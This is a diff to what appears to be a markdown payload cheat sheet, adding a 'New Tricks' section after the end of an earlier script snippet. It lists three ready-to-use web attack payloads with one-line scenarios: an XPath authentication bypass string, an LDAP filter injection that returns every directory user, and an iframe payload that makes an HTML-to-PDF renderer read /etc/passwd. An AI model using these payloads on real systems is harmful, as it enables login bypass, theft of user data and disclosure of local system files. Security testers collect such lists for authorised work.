@@ -215,3 +215,17 @@ base64 encoded
 	x.send();
 </script>
 ```
+
+## New Tricks
+
+### Trick 1
+- Scenario: XPath auth bypassed with boolean expression in username field.
+- Payload: `' or '1'='1`
+
+### Trick 2
+- Scenario: LDAP filter injection returned all users from directory.
+- Payload: `*)(uid=*))(|(uid=*`
+
+### Trick 3
+- Scenario: PDF renderer fetched local file during HTML-to-PDF conversion.
+- Payload: `<iframe src="file:///etc/passwd"></iframe>`
